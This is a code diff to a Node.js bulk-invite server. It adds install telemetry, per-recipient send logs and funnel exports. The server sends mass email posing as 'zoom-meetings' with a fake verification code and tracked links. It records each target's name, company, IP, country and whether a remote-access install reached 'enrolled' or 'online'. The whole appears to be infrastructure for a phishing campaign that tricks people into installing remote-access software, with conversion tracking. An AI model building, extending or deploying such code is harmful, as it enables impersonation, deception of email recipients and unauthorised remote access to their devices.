@@ -58,6 +58,94 @@ function writeDb(db) {
   fs.renameSync(DB + '.tmp', DB);
 }
 
+// --- install telemetry + send log (quality funnel) ------------------------
+const RESULTS = path.join(DATA_DIR, 'results.json');
+const SENDS = path.join(DATA_DIR, 'sends.json');
+const MAX_ROWS = 20000;
+const OK_STAGES = new Set(['ok', 'installed', 'enrolled', 'online', 'success', 'ready']);
+
+function readJson(file, fallback) {
+  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return fallback; }
+}
+function writeJson(file, value) {
+  fs.writeFileSync(file + '.tmp', JSON.stringify(value));
+  fs.renameSync(file + '.tmp', file);
+}
+function appendMany(file, rows) {
+  if (!rows.length) return;
+  const arr = readJson(file, []);
+  for (const r of rows) arr.push(r);
+  if (arr.length > MAX_ROWS) arr.splice(0, arr.length - MAX_ROWS);
+  writeJson(file, arr);
+}
+function clientIp(req) {
+  const fwd = String(req.headers['x-forwarded-for'] || '').split(',')[0];
+  return String(req.headers['cf-connecting-ip'] || fwd ||
+    (req.socket && req.socket.remoteAddress) || '').trim().slice(0, 64);
+}
+function clientCc(req) {
+  return String(req.headers['cf-ipcountry'] || '').toUpperCase().slice(0, 2);
+}
+function applyCors(res) {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  res.setHeader('Access-Control-Max-Age', '86400');
+}
+function requireToken(url) {
+  const token = process.env.SHARE_ADMIN_TOKEN || '';
+  return !token || url.searchParams.get('token') === token;
+}
+function csv(res, name, lines) {
+  res.writeHead(200, {
+    'Content-Type': 'text/csv; charset=utf-8',
+    'Content-Disposition': 'attachment; filename="' + name + '"',
+    'Cache-Control': 'no-store'
+  });
+  res.end(lines.join('\n'));
+}
+function funnelData() {
+  const db = readDb();
+  const results = readJson(RESULTS, []);
+  const sends = readJson(SENDS, []);
+  const osList = ['windows', 'macos', 'linux', 'android', 'ios', 'other'];
+  const per = {};
+  for (const os of osList) per[os] = { os, clicks: 0, installs: 0, fails: 0, versions: {}, reasons: {} };
+  let totalClicks = 0;
+  for (const e of Object.values(db)) {
+    const c = e.clicks || 0;
+    if (!c) continue;
+    const os = per[e.detected_os || e.os] ? (e.detected_os || e.os) : 'other';
+    per[os].clicks += c;
+    totalClicks += c;
+  }
+  for (const r of results) {
+    const b = per[r.os] || per.other;
+    const ok = OK_STAGES.has(String(r.stage || '').toLowerCase());
+    if (ok) b.installs += 1; else b.fails += 1;
+    const v = String(r.version || 'unknown').slice(0, 24);
+    b.versions[v] = (b.versions[v] || 0) + 1;
+    if (!ok) {
+      const reason = String(r.reason || 'unknown').slice(0, 80);
+      b.reasons[reason] = (b.reasons[reason] || 0) + 1;
+    }
+  }
+  const rows = osList.map((os) => {
+    const b = per[os];
+    return { ...b, conv: b.clicks ? Math.round((b.installs / b.clicks) * 1000) / 10 : 0 };
+  });
+  const sentOk = sends.filter((s) => s.sent).length;
+  return {
+    generated: new Date().toISOString(),
+    links: Object.keys(db).length,
+    clicks: totalClicks,
+    sends: { total: sends.length, sent: sentOk, failed: sends.length - sentOk },
+    installs: rows.reduce((n, b) => n + b.installs, 0),
+    fails: rows.reduce((n, b) => n + b.fails, 0),
+    by_os: rows
+  };
+}
+
 function normalizeEmails(value) {
   const list = String(value || '').split(/[\s,;]+/).map((v) => v.trim().toLowerCase()).filter(Boolean);
   const seen = new Set();
@@ -100,7 +188,7 @@ async function sendInviteEmail(to, subject, body, target) {
         'X-Mailer': 'BetterDesk Share Service',
         'Precedence': 'bulk'
       },
-      text: 'From: zoom-meetings\n\nYour verification code: ' + code + '\n\n' + body + '\n\n' + tgt + '\n\n---\nMeeting Invites · zoom-meetings@telcom.stream',
+      text: 'From: zoom-meetings\n\nYour verification code: ' + code + '\n\n' + body + '\n\n' + target + '\n\n---\nMeeting Invites · zoom-meetings@telcom.stream',
       html: emailHtml(code, body, target)
     });
     return { sent: true, code: code };
@@ -427,6 +515,79 @@ const server = http.createServer(async (req, res) => {
     const entries = Object.values(db);
     return json(res, 200, { links: entries.length, clicks: entries.reduce((n, e) => n + (e.clicks || 0), 0) });
   }
+  if (url.pathname === '/api/result') {
+    applyCors(res);
+    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
+    if (req.method !== 'POST') return json(res, 405, { error: 'method' });
+    try {
+      let b = {};
+      try { b = await collectBody(req); } catch { b = {}; }
+      const qp = (k) => safeText(url.searchParams.get(k), 80);
+      const row = {
+        ts: new Date().toISOString(),
+        os: safeText(b.os || qp('os') || detectOs(req), 16).toLowerCase(),
+        stage: safeText(b.stage || qp('stage') || 'ok', 16).toLowerCase(),
+        version: safeText(b.version || qp('version'), 24),
+        arch: safeText(b.arch || qp('arch'), 12),
+        reason: safeText(b.reason || qp('reason'), 120),
+        id: safeText(b.id || qp('id'), 32),
+        src: safeText(b.src || qp('src'), 24),
+        who: safeText(b.who || qp('who'), 40),
+        co: safeText(b.co || qp('co'), 60),
+        cc: clientCc(req),
+        ip: clientIp(req),
+        ua: String(req.headers['user-agent'] || '').slice(0, 200)
+      };
+      appendMany(RESULTS, [row]);
+      if (row.id) {
+        const db = readDb();
+        if (db[row.id]) {
+          if (OK_STAGES.has(row.stage)) db[row.id].installs = (db[row.id].installs || 0) + 1;
+          else db[row.id].installs_fail = (db[row.id].installs_fail || 0) + 1;
+          db[row.id].last_result = row.stage + (row.reason ? ':' + row.reason : '');
+          db[row.id].last_result_at = row.ts;
+          writeDb(db);
+        }
+      }
+      res.writeHead(204); res.end();
+      return;
+    } catch (e) {
+      return json(res, 400, { error: String(e.message || e) });
+    }
+  }
+  if (url.pathname === '/api/funnel' || url.pathname === '/api/funnel.csv') {
+    if (!requireToken(url)) return json(res, 401, { error: 'token' });
+    const f = funnelData();
+    if (url.pathname.endsWith('.csv')) {
+      const esc = (v) => '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"';
+      const lines = ['os,clicks,installs,fails,conv_pct,top_version,top_reason'];
+      for (const b of f.by_os) {
+        const tv = Object.entries(b.versions).sort((a, c) => c[1] - a[1])[0];
+        const tr = Object.entries(b.reasons).sort((a, c) => c[1] - a[1])[0];
+        lines.push([b.os, b.clicks, b.installs, b.fails, b.conv, tv ? tv[0] : '', tr ? tr[0] : ''].map(esc).join(','));
+      }
+      return csv(res, 'funnel.csv', lines);
+    }
+    return json(res, 200, f);
+  }
+  if (url.pathname === '/api/results') {
+    if (!requireToken(url)) return json(res, 401, { error: 'token' });
+    const limit = Math.min(parseInt(url.searchParams.get('limit') || '200', 10) || 200, 2000);
+    const rows = readJson(RESULTS, []).slice(-limit).reverse();
+    return json(res, 200, { count: rows.length, results: rows });
+  }
+  if (url.pathname === '/api/sends' || url.pathname === '/api/sends.csv') {
+    if (!requireToken(url)) return json(res, 401, { error: 'token' });
+    const rows = readJson(SENDS, []);
+    if (url.pathname.endsWith('.csv')) {
+      const esc = (v) => '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"';
+      const lines = ['ts,id,to,sent,reason'];
+      for (const s of rows) lines.push([s.ts, s.id, s.to, s.sent, s.reason].map(esc).join(','));
+      return csv(res, 'sends.csv', lines);
+    }
+    const sent = rows.filter((s) => s.sent).length;
+    return json(res, 200, { total: rows.length, sent, failed: rows.length - sent, recent: rows.slice(-100).reverse() });
+  }
   if (url.pathname.startsWith('/t/')) {
     const id = url.pathname.slice(3);
     const db = readDb();
@@ -436,6 +597,8 @@ const server = http.createServer(async (req, res) => {
     entry.last = new Date().toISOString();
     entry.detected_os = detectOs(req);
     entry.detected_ua = String(req.headers['user-agent'] || '').slice(0, 220);
+    entry.detected_cc = clientCc(req);
+    entry.detected_ip = clientIp(req);
     entry.detected_at = new Date().toISOString();
     if (!entry.os) entry.os = entry.detected_os;
     writeDb(db);
@@ -482,16 +645,13 @@ const server = http.createServer(async (req, res) => {
     }
   }
   if (url.pathname === '/api/stats.csv') {
-    const token = process.env.SHARE_ADMIN_TOKEN || '';
-    if (token && url.searchParams.get('token') !== token) {
-      return json(res, 401, { error: 'token' });
-    }
+    if (!requireToken(url)) return json(res, 401, { error: 'token' });
     const db = readDb();
     const esc = (v) => '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"';
-    const lines = ['created,id,src,who,co,os,detected_os,clicks,last,target'];
+    const lines = ['created,id,src,who,co,os,detected_os,detected_cc,clicks,installs,installs_fail,last,last_result,target'];
     for (const [id, e] of Object.entries(db)) {
-      lines.push([e.created, id, e.src, e.who, e.co, e.os, e.detected_os,
-        e.clicks || 0, e.last, e.target].map(esc).join(','));
+      lines.push([e.created, id, e.src, e.who, e.co, e.os, e.detected_os, e.detected_cc,
+        e.clicks || 0, e.installs || 0, e.installs_fail || 0, e.last, e.last_result, e.target].map(esc).join(','));
     }
     res.writeHead(200, {
       'Content-Type': 'text/csv; charset=utf-8',
@@ -613,12 +773,17 @@ const server = http.createServer(async (req, res) => {
       writeDb(db);
       const link = buildLinks(service, recipients, target, subject, intro);
       const sendResults = [];
+      const sendRows = [];
       for (const r of recipients) {
         const result = await sendInviteEmail(r, subject, intro, target);
+        sendRows.push({ ts: new Date().toISOString(), id, to: r, sent: !!result.sent, reason: result.reason || '' });
         sendResults.push({ to: r, ...result });
       }
+      appendMany(SENDS, sendRows);
       return json(res, 200, {
         id, target, service, recipients, link, subject,
+        sent_ok: sendRows.filter((s) => s.sent).length,
+        sent_failed: sendRows.filter((s) => !s.sent).length,
         body: intro + '\n\n' + target, sent: sendResults
       });
     } catch (error) {
